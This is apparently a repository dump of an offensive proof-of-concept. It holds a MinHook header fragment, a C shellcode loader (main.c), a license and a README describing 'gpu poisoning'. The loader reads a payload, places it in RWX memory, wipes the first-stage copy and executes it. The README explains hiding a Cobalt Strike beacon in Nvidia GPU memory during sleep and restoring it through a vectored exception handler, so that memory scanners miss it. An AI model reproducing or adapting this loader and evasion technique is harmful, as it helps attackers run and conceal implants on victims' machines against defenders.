    // Parameters:
    //   pTarget [in] A pointer to the target function.
    //                If this parameter is MH_ALL_HOOKS, all created hooks are
    //                queued to be disabled.
    MH_STATUS WINAPI MH_QueueDisableHook(LPVOID pTarget);

    // Applies all queued changes in one go.
    MH_STATUS WINAPI MH_ApplyQueued(VOID);

    // Translates the MH_STATUS to its name as a string.
    const char* WINAPI MH_StatusToString(MH_STATUS status);

#ifdef __cplusplus
}
#endif

```

`GP/main.c`:

```c
/*
	PROGRAMMED BY ORCA 3:20 PM 6/25/2022
	POC ON USING GPU MEMORY TO HIDE THE PAYLOAD
*/

#include <Windows.h>
#include <stdio.h>
#include "Common.h"

//#define DEBUG	  // just to save time and run ReadPayloadFile directly using a default path
#define GPUEngage // the thing
#define CleanStg1 // clean the first stage, (payload we read)

//------------------------------------------------------------------------------------------------------------------------------------------------------------------------//
// function to read the payload from disk
BOOL ReadPayloadFile(char* FileInput, PDWORD Stage1Size, unsigned char** PayloadRead) {
	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD FileSize, lpNumberOfBytesRead;
	BOOL Succ;

	hFile = CreateFileA(FileInput, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] ERROR CreateFileA : %d\n", GetLastError());
		return FALSE;
	}

	FileSize = GetFileSize(hFile, NULL);
	unsigned char* Payload = (unsigned char*)malloc(FileSize);
	ZeroMemory(Payload, sizeof Payload);

	Succ = ReadFile(hFile, Payload, FileSize, &lpNumberOfBytesRead, NULL);
	if (!Succ) {
		printf("[!] ERROR ReadFile : %d\n", GetLastError());
		return FALSE;
	}
	
	printf("[i] Payload [%d] at 0x%p\n", lpNumberOfBytesRead, (void*)Payload);

	*PayloadRead = Payload;
	*Stage1Size = lpNumberOfBytesRead;

	CloseHandle(hFile);
	return TRUE;
}

//------------------------------------------------------------------------------------------------------------------------------------------------------------------------//
#ifdef CleanStg1
typedef struct _CleanStage1 {
	DWORD Stage1Size;
	PVOID Stage1Address;
} CleanStage1, *PCleanStage1;

// http://filipivianna.blogspot.com/2010/07/usleep-on-windows-win32.html
void uSleep(int waitTime) {
	__int64 time1 = 0, time2 = 0, freq = 0;

	QueryPerformanceCounter((LARGE_INTEGER*)&time1);
	QueryPerformanceFrequency((LARGE_INTEGER*)&freq);

	do {
		QueryPerformanceCounter((LARGE_INTEGER*)&time2);
	} while ((time2 - time1) < waitTime);
}

void CleanStage1Thread (PCleanStage1 ThreadPrameters) {
	// Sleep for 3 sec , NOTE, that we can't use Sleep function cz its hooked 
	uSleep(3000000);
	ZeroMemory(ThreadPrameters->Stage1Address, ThreadPrameters->Stage1Size);
	VirtualFree(ThreadPrameters->Stage1Address, ThreadPrameters->Stage1Size, MEM_DECOMMIT);
}
#endif // CleanStg1

//------------------------------------------------------------------------------------------------------------------------------------------------------------------------//


int main(int argc, char ** argv) {

	PVOID Stage1Address = NULL;
	DWORD Stage1Size = NULL;
	unsigned char* Payload;
	

#ifndef DEBUG
	if (argc != 2) {
		printf("[-] Please Enter The Path Of The File To Run ... \n");
		return -1;
	}
	if (!ReadPayloadFile(argv[1], &Stage1Size, &Payload)) {
		return -1;
	}
#else // in case of debugging:
#define DEFAULT_PD_PATH "C:\\full\\path\\to\\payload.bin"
	if (!ReadPayloadFile(DEFAULT_PD_PATH, &Stage1Size, &Payload)) {
		return -1;
	}
#endif // !DEBUG

	if (Stage1Size == NULL || Payload == NULL){
		return -1;
	}

	// you could do better than VirtualAlloc with RWX, just a poc here ...
	if ((Stage1Address = VirtualAlloc(NULL, Stage1Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL){
		printf("[!] ERROR VirtualAlloc : %d\n", GetLastError());
		return -1;
	}
	else{
		memcpy(Stage1Address, Payload, Stage1Size);
		free(Payload); // freeing the read payload
	}

#ifdef GPUEngage
	if (!IsNvidiaGraphicsCardPresent()){
		printf("[!] You dont have nvidia gpu ... \n");
		return -1;
	}
	if (!InitializeMemToGpu()) {
		printf("[!] InitializeMemToGpu failed ... \n");
		return -1;
	}
#endif // GPUEngage


#ifdef CleanStg1
	// this is to clean stage 1 payload (the one we read)
	CleanStage1 ThreadPrameters = { 0 };
	ThreadPrameters.Stage1Size = Stage1Size;
	ThreadPrameters.Stage1Address = Stage1Address;
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CleanStage1Thread, &ThreadPrameters, 0, NULL);
#endif // CleanStg1

	

	// running 
	(*(void(*)())Stage1Address)();

	printf("[i] Hit Enter To Exit ...");
	getchar();

	return 0;
}
```

`LICENSE`:

```
MIT License

Copyright (c) 2022 ORCA

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`README.md`:

```md
### gpu poisoning; hide the payload inside the gpu memory.

##### after my older [repo](https://gitlab.com/ORCA000/t.d.p), in which i used the thread description to hide the payload, i wanted to find new way, so now im using **nividia** gpu memory using cuda api's to allocate, write, and free when there is no need for the payload to be found in memory.

#### Steps:
1- first, we need to setup and initialize some structs / and run our ve handler.

2- second, we run the **stageless** payload, we **must** use stageless, to know where
the reflection will land (im using cobalt strike and it uses dll reflective loader), we only care about the `2nd stage` cz thats the actual 
payload. i didnt add any tricks to this step, just a virtualalloc and a rwx section

3- now when the payload goes to sleep, we copy the payload to the gpu memory, and clean the payload in the real memory.

4- when the sleep is done, the veh will handle the exception (EXCEPTION_ACCESS_VIOLATION) by re-setting the memory permissions to `PAGE_EXECUTE_READWRITE`, and placing the payload back in place from the gpu.


#### Demo:
![img](https://gitlab.com/ORCA000/gp/-/raw/main/images/demo1.png)
#### Thanks for : [vxunderground papers](https://github.com/vxunderground/VXUG-Papers/blob/main/GpuMemoryAbuse.cpp)


<br>
<br>
<br>




```